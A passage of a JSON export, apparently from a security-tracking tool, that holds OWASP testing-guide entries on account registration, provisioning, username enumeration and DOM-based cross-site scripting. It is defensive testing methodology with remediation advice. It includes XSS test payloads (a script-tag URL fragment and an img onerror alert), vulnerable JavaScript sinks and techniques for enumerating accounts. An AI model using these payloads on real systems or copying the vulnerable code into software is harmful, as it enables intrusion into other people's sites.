Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-IDNT-02 Test User Registration Process","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/02-Test_User_Registration_Process","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/02-Test_User_Registration_Process","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nSome websites offer a user registration process that automates (or semi-automates) the provisioning of system access to users. The identity requirements for access vary from positive identification to none at all, depending on the security requirements of the system. Many public applications completely automate the registration and provisioning process because the size of the user base makes it impossible to manage manually. However, many corporate applications will provision users manually, so this test case may not apply.","TestingInstructions":"## Test Objectives\n\n* Verify that the identity requirements for user registration are aligned with business and security requirements.\n* Validate the registration process.\n\n## How to Test\n\nVerify that the identity requirements for user registration are aligned with business and security requirements:\n\n1. Can anyone register for access?\n2. Are registrations vetted by a human prior to provisioning, or are they automatically granted if the criteria are met?\n3. Can the same person or identity register multiple times?\n4. Can users register for different roles or permissions?\n5. What proof of identity is required for a registration to be successful?\n6. Are registered identities verified?\n\nValidate the registration process:\n\n1. Can identity information be easily forged or faked?\n2. Can the exchange of identity information be manipulated during registration?\n\n### Example\n\nIn the WordPress example below, the only identification requirement is an email address that is accessible to the registrant.\n![WordPress Registration Page](Image Not Found)\n*Figure 4.3.2-1: WordPress Registration Page*\nIn contrast, in the Google example below the identification requirements include name, date of birth, country, mobile phone number, email address and CAPTCHA response. While only two of these can be verified (email address and mobile number), the identification requirements are stricter than WordPress.\n![Google Registration Page](Image Not Found)\n*Figure 4.3.2-2: Google Registration Page*\n\n\u003Cbr\u003E\n\u003Cbr\u003E\n## Tools\n\nA HTTP proxy can be a useful tool to test this control.","Details":null,"Implication":null,"Recommendation":"## Remediation\n\nImplement identification and verification requirements that correspond to the security requirements of the information the credentials protect.","References":"## References\n\n[User Registration Design](https://mashable.com/2011/06/09/user-registration-design/)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"03-Identity Management Testing","Description":"03-Identity Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"2e8d945a-036f-4f90-94fe-f3e52f31fa7c","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-IDNT-03 Test Account Provisioning Process","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/03-Test_Account_Provisioning_Process","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/03-Test_Account_Provisioning_Process","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nThe provisioning of accounts presents an opportunity for an attacker to create a valid account without application of the proper identification and authorization process.","TestingInstructions":null,"Details":null,"Implication":null,"Recommendation":null,"References":"## Test Objectives\n\n* Verify which accounts may provision other accounts and of what type.\n\n## How to Test\n\nDetermine which roles are able to provision users and what sort of accounts they can provision.\n\n* Is there any verification, vetting and authorization of provisioning requests?\n* Is there any verification, vetting and authorization of de-provisioning requests?\n* Can an administrator provision other administrators or just users?\n* Can an administrator or other user provision accounts with privileges greater than their own?\n* Can an administrator or user de-provision themselves?\n* How are the files or resources owned by the de-provisioned user managed? Are they deleted? Is access transferred?\n\n### Example\n\nIn WordPress, only a user\u2019s name and email address are required to provision the user, as shown below:\n![WordPress User Add](Image Not Found)\n*Figure 4.3.3-1: WordPress User Add*\nDe-provisioning of users requires the administrator to select the users to be de-provisioned, select Delete from the dropdown menu (circled) and then applying this action. The administrator is then presented with a dialog box asking what to do with the user\u2019s posts (delete or transfer them).\n![WordPress Auth and Users](Image Not Found)\n*Figure 4.3.3-2: WordPress Auth and Users*\n\n## Tools\n\nWhile the most thorough and accurate approach to completing this test is to conduct it manually, HTTP proxy tools could be also useful.","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"03-Identity Management Testing","Description":"03-Identity Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"2e8d945a-036f-4f90-94fe-f3e52f31fa7c","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-IDNT-04 Testing for Account Enumeration and Guessable User Account","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nThe scope of this test is to verify if it is possible to collect a set of valid usernames by interacting with the authentication mechanism of the application. This test will be useful for brute force testing, in which the tester verifies if, given a valid username, it is possible to find the corresponding password.\nOften, web applications reveal when a username exists on system, either as a consequence of mis-configuration or as a design decision. For example, sometimes, when we submit wrong credentials, we receive a message that states that either the username is present on the system or the provided password is wrong. The information obtained can be used by an attacker to gain a list of users on system. This information can be used to attack the web application, for example, through a brute force or default username and password attack.\nThe tester should interact with the authentication mechanism of the application to understand if sending particular requests causes the application to answer in different manners. This issue exists because the information released from web application or web server when the user provide a valid username is different than when they use an invalid one.\nIn some cases, a message is received that reveals if the provided credentials are wrong because an invalid username or an invalid password was used. Sometimes, testers can enumerate the existing users by sending a username and an empty password.","TestingInstructions":"## Test Objectives\n\n* Review processes that pertain to user identification (*e.g.* registration, login, etc.).\n* Enumerate users where possible through response analysis.\n\n## How to Test\n\nIn black-box testing, the tester knows nothing about the specific application, username, application logic, error messages on log in page, or password recovery facilities. If the application is vulnerable, the tester receives a response message that reveals, directly or indirectly, some information useful for enumerating users.\n\n### HTTP Response Message\n\n#### Testing for Valid Credentials\n\nRecord the server answer when you submit a valid user ID and valid password.\n\n\u003E Using a web proxy, notice the information retrieved from this successful authentication (HTTP 200 Response, length of the response).\n\n#### Testing for Valid User with Wrong Password\n\nNow, the tester should try to insert a valid user ID and a wrong password and record the error message generated by the application.\n\n\u003E The browser should display a message similar to the following one:\n\u003E ![Authentication Failed](Image Not Found)\n\u003E *Figure 4.3.4-1: Authentication Failed*\n\u003E Unlike any message that reveals the existence of the user like the following:\n\u003E \u0060Login for User foo: invalid password\u0060\n\u003E Using a web proxy, notice the information retrieved from this unsuccessful authentication attempt (HTTP 200 Response, length of the response).\n\n#### Testing for a Nonexistent Username\n\nNow, the tester should try to insert an invalid user ID and a wrong password and record the server answer (the tester should be confident that the username is not valid in the application). Record the error message and the server answer.\n\n\u003E If the tester enters a nonexistent user ID, they can receive a message similar to:\n\u003E ![This User is Not Active](Image Not Found)\n\u003E *Figure 4.3.4-3: This User is Not Active*\n\u003E or a message like the following one:\n\u003E \u0060Login\u00A0failed\u00A0for\u00A0User\u00A0foo:\u00A0invalid\u00A0Account\u0060\n\u003E Generally the application should respond with the same error message and length to the different incorrect requests. If the responses are not the same, the tester should investigate and find out the key that creates a difference between the two responses. For example:\n\u003E\n\u003E 1. Client request: Valid user/wrong password\n\u003E 2. Server response: The password is not correct\n\u003E 3. Client request: Wrong user/wrong password\n\u003E 4. Server response: User not recognized\n\u003E\n\u003E The above responses let the client understand that for the first request they have a valid username. So they can interact with the application requesting a set of possible user IDs and observing the answer.\n\u003E Looking at the second server response, the tester understand in the same way that they don\u2019t hold a valid username. So they can interact in the same manner and create a list of valid user ID looking at the server answers.\n\n### Other Ways to Enumerate Users\n\nTesters can enumerate users in several ways, such as:\n\n#### Analyzing the Error Code Received on Login Pages\n\nSome web application release a specific error code or message that we can analyze.\n\n#### Analyzing URLs and URL Redirections\n\nFor example:\n\n* \u0060http://www.foo.com/err.jsp?User=baduser\u0026Error=0\u0060\n* \u0060http://www.foo.com/err.jsp?User=gooduser\u0026Error=2\u0060\n\nAs is seen above, when a tester provides a user ID and password to the web application, they see a message indication that an error has occurred in the URL. In the first case they have provided a bad user ID and bad password. In the second, a good user ID and a bad password, so they can identify a valid user ID.\n\n#### URI Probing\n\nSometimes a web server responds differently if it receives a request for an existing directory or not. For instance in some portals every user is associated with a directory. If testers try to access an existing directory they could receive a web server error.\nSome of the common errors received from web servers are:\n\n* 403 Forbidden error code\n* 404 Not found error code\n\nExample:\n\n* \u0060http://www.foo.com/account1\u0060 \\- we receive from web server: 403 Forbidden\n* \u0060http://www.foo.com/account2\u0060\u00A0-\u00A0we\u00A0receive\u00A0from\u00A0web\u00A0server:\u00A0404\u00A0file\u00A0Not\u00A0Found\n\nIn the first case the user exists, but the tester cannot view the web page, in second case instead the user \u201Caccount2\u201D does not exist. By collecting this information testers can enumerate the users.\n\n#### Analyzing Web Page Titles\n\nTesters can receive useful information on Title of web page, where they can obtain a specific error code or messages that reveal if the problems are with the username or password.\nFor instance, if a user cannot authenticate to an application and receives a web page whose title is similar to:\n\n* \u0060Invalid\u00A0user\u0060\n* \u0060Invalid\u00A0authentication\u0060\n\n#### Analyzing a Message Received from a Recovery Facility\n\nWhen we use a recovery facility (i.e. a forgotten password function) a vulnerable application might return a message that reveals if a username exists or not.\nFor example, messages similar to the following:\n\n* \u0060Invalid username: email address is not valid or the specified user was not found.\u0060\n* \u0060Valid\u00A0username:\u00A0Your\u00A0password\u00A0has\u00A0been\u00A0successfully\u00A0sent\u00A0to\u00A0the\u00A0email\u00A0address\u00A0you\u00A0registered\u00A0with.\u0060\n\n#### Friendly 404 Error Message\n\nWhen we request a user within the directory that does not exist, we don\u2019t always receive 404 error code. Instead, we may receive \u201C200 OK\u201D with an image, in this case we can assume that when we receive the specific image the user does not exist. This logic can be applied to other web server response; the trick is a good analysis of web server and web application messages.\n\n#### Analyzing Response Times\n\nAs well as looking at the content of the responses, the time that the response takes should also be considered. Particularly where the request causes an interaction with an external service (such as sending a forgotten password email), this can add several hundred milliseconds to the response, which can be used to determine whether the requested user is valid.\n\n### Guessing Users\n\nIn some cases the user IDs are created with specific policies of administrator or company. For example we can view a user with a user ID created in sequential order:\n\n\u0060\u0060\u0060\nCN000100\nCN000101\n...\n\u0060\u0060\u0060\n\nSometimes the usernames are created with a REALM alias and then a sequential numbers:\n\n* R1001 \u2013 user 001 for REALM1\n* R2001 \u2013 user 001 for REALM2\n\nIn the above sample we can create simple shell scripts that compose user IDs and submit a request with tool like wget to automate a web query to discern valid user IDs. To create a script we can also use Perl and curl.\nOther possibilities are: - user IDs associated with credit card numbers, or in general numbers with a pattern. - user IDs associated with real names, e.g. if Freddie Mercury has a user ID of \u201Cfmercury\u201D, then you might guess Roger Taylor to have the user ID of \u201Crtaylor\u201D.\nAgain, we can guess a username from the information received from an LDAP query or from Google information gathering, for example, from a specific domain. Google can help to find domain users through specific queries or through a simple shell script or tool.\n\n\u003E By enumerating user accounts, you risk locking out accounts after a predefined number of failed probes (based on application policy). Also, sometimes, your IP address can be banned by dynamic rules on the application firewall or Intrusion Prevention System.\n\n### Testing Staff Impersonation\n\nEnsure that unregistered users are unable to select reserved usernames (e.g., admin, administrator, moderator) during the registration process. Additionally, verify that users cannot edit their current username to one of these reserved usernames on the profile editing page.\nIf the web application has features that allow a user to access the web application\u2019s registration and profile editing functionality, the interactions to test include the following:\n\n* Registration process:\n    * Access the registration page as an unregistered user and fill in the registration form, entering one of the reserved usernames (e.g., admin, administrator, moderator), submit the registration form, and then verify the response.\n    * The registration process should reject the form submission and display an error message indicating that the selected username is not available for registration.\n* Profile editing page:\n    * Log into the web application using valid credentials and navigate to the profile editing page. Attempt to change the current username to one of the reserved usernames (e.g., admin, administrator, moderator) and save the changes to verify the behavior.\n    * The profile editing process should reject the username change request and display an error message indicating that the selected username is not available.\n* Test for variants and similarities:\n    * Repeat the above steps for different variations of the reserved usernames (e.g., Admin, ADMIN, Administrator) and perform tests with different combinations of uppercase and lowercase letters to ensure case insensitivity is handled correctly.\n    * The web application should treat these variants as identical to the reserved usernames, rejecting their selection or modification.\n\n### Gray-Box Testing\n\n#### Testing for Authentication Error Messages\n\nVerify that the application answers in the same manner for every client request that produces a failed authentication. For this issue the black-box testing and gray-box testing have the same concept based on the analysis of messages or error codes received from web application.\n\n\u003E The application should answer in the same manner for every failed attempt of authentication.\n\u003E For Example: *Credentials submitted are not valid*\n\n## Remediation\n\nEnsure the application returns consistent generic error messages in response to invalid account name, password or other user credentials entered during the log in process.\nEnsure default system accounts and test accounts are deleted prior to releasing the system into production (or exposing it to an untrusted network).\n\n## Tools\n\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)\n* [curl](https://curl.haxx.se/)\n* [PERL](https://www.perl.org/)","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* [Username Enumeration Vulnerabilities](https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/)\n* [Prevent WordPress Username Enumeration](https://www.jinsonvarghese.com/prevent-wordpress-username-enumeration/)\n* [Marco Mella, Sun Java Access \u0026 Identity Manager Users enumeration](https://www.exploit-db.com/exploits/32762)\n\n1. \n\n\n\u003Cbr\u003E\n","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"03-Identity Management Testing","Description":"03-Identity Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"2e8d945a-036f-4f90-94fe-f3e52f31fa7c","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-IDNT-05 Testing for Weak or Unenforced Username Policy","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/05-Testing_for_Weak_or_Unenforced_Username_Policy","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/05-Testing_for_Weak_or_Unenforced_Username_Policy","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nUser account names are often highly structured (e.g. Joe Bloggs account name is jbloggs and Fred Nurks account name is fnurks) and valid account names can easily be guessed.","TestingInstructions":"## Test Objectives\n\n* Determine whether a consistent account name structure renders the application vulnerable to account enumeration.\n* Determine whether the application\u2019s error messages permit account enumeration.\n\n## How to Test\n\n* Determine the structure of account names.\n* Evaluate the application\u2019s response to valid and invalid account names.\n* Use different responses to valid and invalid account names to enumerate valid account names.\n* Use account name dictionaries to enumerate valid account names.\n\n\n","Details":null,"Implication":null,"Recommendation":"## Remediation\n\nEnsure the application returns consistent generic error messages in response to invalid account name, password or other user credentials entered during the log in process.","References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"03-Identity Management Testing","Description":"03-Identity Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"2e8d945a-036f-4f90-94fe-f3e52f31fa7c","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-01 Testing for DOM-Based Cross Site Scripting","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"[DOM-based cross-site scripting](https://owasp.org/www-community/attacks/DOM_Based_XSS) is the de-facto name for [XSS](https://owasp.org/www-community/attacks/xss/) bugs that are the result of active browser-side content on a page, typically JavaScript, obtaining user input through a [source](https://github.com/wisec/domxsswiki/wiki/sources) and using it in a [sink](https://github.com/wisec/domxsswiki/wiki/Sinks), leading to the execution of injected code. This document only discusses JavaScript bugs which lead to XSS.\nThe DOM, or [Document Object Model](https://en.wikipedia.org/wiki/Document_Object_Model), is the structural format used to represent documents in a browser. The DOM enables dynamic scripts such as JavaScript to reference components of the document such as a form field or a session cookie. The DOM is also used by the browser for security - for example to limit scripts on different domains from obtaining session cookies for other domains. A DOM-based XSS vulnerability may occur when active content, such as a JavaScript function, is modified by a specially crafted request such that a DOM element that can be controlled by an attacker.\nNot all XSS bugs require the attacker to control the content returned from the server, but can instead abuse poor JavaScript coding practices to achieve the same results. The consequences are the same as a typical XSS flaw, only the means of delivery is different.\nIn comparison to other types of cross site scripting vulnerabilities ([reflected and stored](https://owasp.org/www-community/attacks/xss/), where an un-sanitized parameter is passed by the server then returned to the user and executed in the context of the user\u2019s browser, a DOM-based XSS vulnerability controls the flow of the code by using elements of the Document Object Model (DOM) along with code crafted by the attacker to change the flow.\nDue to their nature, DOM-based XSS vulnerabilities can be executed in many instances without the server being able to determine what is actually being executed. This may make many of the general XSS filtering and detection techniques impotent to such attacks.\nThis hypothetical example uses the following client-side code:\n\n\u0060\u0060\u0060\n\u003Cscript\u003E\ndocument.write(\u0022Site\u00A0is\u00A0at:\u00A0\u0022\u00A0\u002B\u00A0document.location.href\u00A0\u002B\u00A0\u0022.\u0022);\n\u003C/script\u003E\n\u0060\u0060\u0060\n\nAn attacker may append \u0060#\u003Cscript\u003Ealert(\u0027xss\u0027)\u003C/script\u003E\u0060 to the affected page URL which would, when executed, display the alert box. In this instance, the appended code would not be sent to the server as everything after the \u0060#\u0060 character is not treated as part of the query by the browser, but as a fragment. In this example, the code is immediately executed and an alert of \u201Cxss\u201D is displayed by the page. Unlike the more common types of cross site scripting ([reflected and stored](https://owasp.org/www-community/attacks/xss/) in which the code is sent to the server and then back to the browser, this is executed directly in the user\u2019s browser without server contact.\nThe [consequences](https://owasp.org/www-community/attacks/xss/) of DOM-based XSS flaws are as wide ranging as those seen in more well known forms of XSS, including cookie retrieval, further malicious script injection, etc., and should therefore be treated with the same severity.","TestingInstructions":"## Test Objectives\n\n* Identify DOM sinks.\n* Build payloads that pertain to every sink type.\n\n## How to Test\n\nJavaScript applications differ significantly from other types of applications because they are often dynamically generated by the server. To understand what code is being executed, the website being tested needs to be crawled to determine all the instances of JavaScript being executed and where user input is accepted. Many websites rely on large libraries of functions, which often stretch into the hundreds of thousands of lines of code and have not been developed in-house. In these cases, top-down testing often becomes the only viable option, since many bottom level functions are never used, and analyzing them to determine which are sinks will use up more time than is often available. The same can also be said for top-down testing if the inputs or lack thereof is not identified to begin with.\nUser input comes in two main forms:\n\n* Input written to the page by the server in a way that does not allow direct XSS, and\n* Input obtained from client-side JavaScript objects.\n\nHere are two examples of how the server may insert data into JavaScript:\n\n\u0060\u0060\u0060\nvar\u00A0data\u00A0=\u00A0\u0022\u003Cescaped data from the server\u003E\u0022;\nvar\u00A0result\u00A0=\u00A0someFunction(\u0022\u003Cescaped data from the server\u003E\u0022);\n\u0060\u0060\u0060\n\nHere are two examples of input from client-side JavaScript objects:\n\n\u0060\u0060\u0060\nvar\u00A0data\u00A0=\u00A0window.location;\nvar\u00A0result\u00A0=\u00A0someFunction(window.referrer);\n\u0060\u0060\u0060\n\nWhile there is little difference to the JavaScript code in how they are retrieved, it is important to note that when input is received via the server, the server can apply any permutations to the data that it desires. On the other hand, the permutations performed by JavaScript objects are fairly well understood and documented. If \u0060someFunction\u0060 in the above example were a sink, then the exploitability in the former case would depend on the filtering done by the server, whereas in the latter case it would depend on the encoding done by the browser on the \u0060window.referrer\u0060 object. Stefano Di Paulo has written an excellent article on what browsers return when asked for the various elements of a [URL using the document and location attributes](https://github.com/wisec/domxsswiki/wiki/location,-documentURI-and-URL-sources).\nAdditionally, JavaScript is often executed outside of \u0060\u003Cscript\u003E\u0060 blocks, as evidenced by the many vectors which have led to XSS filter bypasses in the past. When crawling the application, it is important to note the use of scripts in places such as event handlers and CSS blocks with expression attributes. Also, note that any off-site CSS or script objects will need to be assessed to determine what code is being executed.\nAutomated testing has only very limited success at identifying and validating DOM-based XSS as it usually identifies XSS by sending a specific payload and attempts to observe it in the server response. This may work fine for the simple example provided below, where the message parameter is reflected back to the user:\n\n\u0060\u0060\u0060\n\u003Cscript\u003E\nvar pos=document.URL.indexOf(\u0022message=\u0022)\u002B5;\ndocument.write(document.URL.substring(pos,document.URL.length));\n\u003C/script\u003E\n\u0060\u0060\u0060\n\nHowever, it may not be detected in the following contrived case:\n\n\u0060\u0060\u0060\n\u003Cscript\u003E\nvar navAgt = navigator.userAgent;\n\nif (navAgt.indexOf(\u0022MSIE\u0022)!=-1) {\n        document.write(\u0022You are using IE as a browser and visiting site: \u0022 \u002B document.location.href \u002B \u0022.\u0022);\n}\nelse\n{\n    document.write(\u0022You are using an unknown browser.\u0022);\n}\n\u003C/script\u003E\n\u0060\u0060\u0060\n\nFor this reason, automated testing will not detect areas that may be susceptible to DOM-based XSS unless the testing tool can perform additional analysis of the client-side code.\nManual testing should therefore be undertaken and can be done by examining areas in the code where parameters are referred to that may be useful to an attacker. Examples of such areas include places where code is dynamically written to the page and elsewhere where the DOM is modified or even where scripts are directly executed.","Details":null,"Implication":null,"Recommendation":"For measures to prevent DOM-based XSS, see the [DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).","References":"* [DomXSSWiki](https://github.com/wisec/domxsswiki/wiki/)\n* [DOM XSS article by Amit Klein](http://www.webappsec.org/projects/articles/071105.html)\n\n1. \n\n\n\u003Cbr\u003E\n","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side Testing","Description":"11-Client-side Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"29bcf3e1-e848-40a2-92af-35d6d72b54bd","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CLNT-01-1 Testing for Self DOM Based Cross-Site Scripting","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01.1-Testing_for_Self_DOM_Based_Cross_Site_Scripting","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01.1-Testing_for_Self_DOM_Based_Cross_Site_Scripting","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Self DOM-Based Cross-Site Scripting is a specific attack and needs prior knowledge of DOM-Based cross site scripting and successful social engineering. The term \u2018self\u2019 is a reference here to the fact, that the user needs to inject the payload into the input field, and thus execute the vulnerability themselves. The vulnerability is further specific, as the website\u2019s Content Security Policy (CSP) can block the execution of scripts.\nThis scenario will use the term \u201Csink\u201D in the following manner: In computing, a sink, event sink or data sink is a class or function designed to receive input or events from another object or function. Thus in order to find possible vulnerabilities we first need to identify the sinks of the application we want to test.","TestingInstructions":"## How to Test\n\nThe process of testing for Self DOM-Based cross site scripting follows:\n\n1. Look for vulnerable sinks, which allow user input.\n2. Once a possible sink is identified, a payload can be inserted.\n3. Check the error log in the browser\u2019s developer tools to see the outcome, and draw your conclusions.\n4. Check if an attacker could convince a user to insert the payload with no extensive technical knowledge required.\n\n### Example\n\nThis specific example is from this [hackerone ticket](https://hackerone.com/reports/406587).\nIn the example the following JavaScript function is executed on the website \u0060https://example.com\u0060.\n\n\u0060\u0060\u0060\n//Marketo Form Code\nfunction strip(html) {\n    var tmp = document.createElement(\u0022DIV\u0022);\n    tmp.innerHTML = html;\n    return tmp.textContent || tmp.innerText || \u0022\u0022;\n}\n\n$(\u0027form\u0027).submit(function() {\n    $(\u0027textarea\u0027).val(function() {\n        return strip($(this).val());\n    });\n});\n\u0060\u0060\u0060\n\nAbuse of this functionality can be described as follows:\n\n1. The \u0060submit\u0060 event handler passes the current value of any \u0060textarea\u0060 elements to the \u0060strip\u0060 function.\n2. This function creates a new \u0060div\u0060 element and sets the \u0060innerHTML\u0060 property to the provided value.\n3. In the last step it then returns the \u0060textContent\u0060 property of the resulting \u0060div\u0060.\n\nThis type of code is typically used to remove HTML tags from a string, as the \u0060textContent\u0060 property contains the string which was rendered by the browser when the HTML was parsed. This particular method is inherently insecure because it uses \u0060innerHTML\u0060. When user input is provided to the \u0060innerHTML\u0060 property, it is parsed by the web browser and can therefore lead to the execution of malicious JavaScript.\nThe following payload can be used to test the vulnerability.\u0060\u003Cimg src=x onerror=alert(1) /\u003E\u0060\nThe developer console would display two errors: One which indicates that \u0060https://www.example.com/x\u0060 was requested and returned a 404 (due to the src attribute of the img tag). Another which reported a violation of the website\u2019s CSP.\nThis second error occurred because the browser attempts to execute the JavaScript code in the \u0060onerror\u0060 attribute, but the website\u2019s CSP prevented the execution. Performing the same actions in a browser with CSP disabled allowed the JavaScript in the \u0060onerror\u0060 attribute to execute.\nAn attacker could exploit this vulnerability by convincing a user to paste a malicious payload into the \u2018message\u2019 field of the contact form and then click the \u2018send message\u2019 button. This attack could be enhanced by convincing the user to use a browser version which does not support CSP.","Details":null,"Implication":null,"Recommendation":"In order to properly protect services from DOM based XSS, refer to the [DOM based XSS prevention cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).","References":"* [OWASP - DOM-Based Cross Site Scripting](https://owasp.org/www-community/attacks/DOM_Based_XSS)\n* [CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"11-Client-side 